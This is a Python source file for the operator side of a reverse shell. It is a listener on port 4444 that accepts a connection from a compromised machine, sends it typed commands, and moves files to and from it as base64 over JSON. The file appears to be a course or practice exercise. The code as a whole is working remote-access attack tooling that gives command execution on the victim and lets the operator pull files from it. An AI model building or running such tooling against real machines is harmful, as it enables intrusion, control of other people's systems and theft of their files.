import socket
import json
import base64


class Listener:
    def __init__(self, host, port):
        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        listener.bind((host, port))
        listener.listen(0)
        print("Waiting for a connection...")
        self.connection, address = listener.accept()
        print(f"Connection established from {address}")
    



    def reliable_send(self, data):
        json_data = json.dumps(data)
        self.connection.send((json_data + "\n").encode())
        
    def reliable_receive(self):
        json_data = ""
        while "\n" not in json_data:
            json_data += self.connection.recv(1024).decode()
        return json.loads(json_data.rstrip("\n"))
    def read_file(self, path):
            with open(path, "rb") as file:
                return base64.b64encode(file.read()).decode()

    def write_file(self, path, content):
        with open(path, "wb") as file:
            file.write(content)
        return f"Saved file to {path}"


    def execute_remotely(self, command):
        self.reliable_send(command)
        if command[0] == "exit":
            self.connection.close()
            exit()
        return self.reliable_receive()

    def run(self):
        while True:
            command = input("Enter a command: ")
            command = command.split(" ")
            
            try:
                if command[0] == "upload" and len(command) > 1:
                    file_content = self.read_file(command[1])
                    command.append(file_content)
                    print(command)
                    
                result = self.execute_remotely(command)
                
                if command[0] == "download" and "Error:" not in result:
                    result = self.write_file(command[1], base64.b64decode(result))
            except Exception as e:
                result = f"Error: {e}"
            print(result)


my_listener = Listener("127.0.0.1", 4444)
my_listener.run()